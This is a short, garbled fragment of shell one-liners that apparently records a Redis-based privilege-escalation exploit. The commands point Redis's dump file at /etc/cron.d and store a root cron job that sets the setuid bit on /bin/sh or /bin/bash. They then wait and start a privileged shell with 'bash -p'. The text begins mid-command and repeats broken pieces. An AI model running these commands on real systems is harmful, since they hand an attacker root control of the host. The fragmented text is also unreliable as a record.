" && redis-cli -h 127.0.0.1 -p 6379 SAVE

* * * * * root /bin/bash -c 'chmod +s /bin/sh'

" && redis-cli -h 127.0.0.1 -p 6379 SAVE

redis-cli -h 127.0.0.1 -p 6379 CONFIG SET dir /etc/cron.d && redis-cli -h 127.0.0.1 -p 6379 CONFIG SET dbfilename root_shell && redis-cli -h 127.0.0.1 -p 6379 SET x "

* * * * * root /bin/bash -c 'chmod +s /bin/sh'

" && redis-cli -h 127.0.0.1 -p 6379 SAVE

redis-cli -h 127.0.0.1 -p 6379 CONFIG SET dir /etc/cron.d && redis-cli -h 127.0.0.1 -p 6379 CONFIG SET dbfilename root_shell && redis-cli -h 127.0.0.1 -p 6379 SET x "

* * * * * root /bin/bash -c 'chmod +s /bin/bash'

" && redis-cli -h 127.0.0.1 -p 6379 SAVE && sleep 60 && /bin/bash -p
